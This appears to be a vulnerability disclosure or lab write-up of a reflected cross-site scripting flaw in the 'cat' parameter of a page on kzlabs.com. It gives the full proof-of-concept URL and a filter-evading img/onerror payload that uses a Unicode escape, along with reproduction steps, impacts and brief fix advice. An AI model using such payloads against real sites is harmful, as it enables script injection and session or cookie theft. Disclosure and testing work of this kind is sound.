# Reflected Cross-Site Scripting (XSS) via `cat` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `cat` parameter of the application. User-controlled input is reflected into the HTML response without proper sanitization, allowing arbitrary JavaScript execution in the victim’s browser.

The vulnerability can be exploited using an `<img>` tag with an `onerror` event handler and Unicode escape sequence bypass.

---

## Vulnerable Endpoint

```text id="v7m2qa"
http://kzlabs.com/11.php?cat=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

---

## Vulnerable Parameter

```text id="r4x8zn"
cat
```

---

## Payload Used

```html id="k9c1wp"
<iMg src=x onerror=\u0063onfirm?.(1)>
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/11.php?cat=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
   ```

2. Observe that the payload is reflected into the page without proper sanitization.

3. The injected `<img>` element triggers the `onerror` event handler.

4. JavaScript executes successfully and displays a popup dialog.

---

## Proof of Concept

```text id="p5n7md"
http://kzlabs.com/11.php?cat=%3CiMg%20src=x%20onerror=\u0063onfirm?.(1)%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/78643d59-ecb1-4a1c-be03-61f2c7bb676f" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
